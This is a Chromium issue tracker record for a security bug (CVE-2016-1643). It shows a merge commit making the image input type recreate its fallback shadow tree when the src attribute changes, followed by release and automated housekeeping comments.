  https://chromium.googlesource.com/chromium/src.git/+/f75158f5e6aefe1cfd901e382757c243dacdba2c

commit f75158f5e6aefe1cfd901e382757c243dacdba2c
Author: Kent Tamura <tkent@chromium.org>
Date: Thu Mar 03 06:34:59 2016

Merge "ImageInputType::ensurePrimaryContent should recreate UA shadow tree." to M49 branch

Once the fallback shadow tree was created, it was never recreated even if
ensurePrimaryContent was called.  Such situation happens by updating |src|
attribute.

BUG=589838

Review URL: https://codereview.chromium.org/1732753004

Cr-Commit-Position: refs/heads/master@{#377804}
(cherry picked from commit 2386a6a49ea992a1e859eb0296c1cc53e5772cdb)

Review URL: https://codereview.chromium.org/1756363003 .

Cr-Commit-Position: refs/branch-heads/2623@{#566}
Cr-Branched-From: 92d77538a86529ca35f9220bd3cd512cbea1f086-refs/heads/master@{#369907}

[modify] https://crrev.com/f75158f5e6aefe1cfd901e382757c243dacdba2c/third_party/WebKit/Source/core/html/HTMLInputElementTest.cpp
[modify] https://crrev.com/f75158f5e6aefe1cfd901e382757c243dacdba2c/third_party/WebKit/Source/core/html/forms/ImageInputType.cpp


### bu...@chromium.org (2016-03-04)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/f75158f5e6aefe1cfd901e382757c243dacdba2c

commit f75158f5e6aefe1cfd901e382757c243dacdba2c
Author: Kent Tamura <tkent@chromium.org>
Date: Thu Mar 03 06:34:59 2016


### ti...@google.com (2016-03-08)

cloudfuzzer - This will ship today. Also, I'll answer your email sometime this week - things are very busy on my end!

CVE-ID is CVE-2016-1643 and this will ship today.

### cl...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### ti...@google.com (2016-03-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/589838?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083758)*
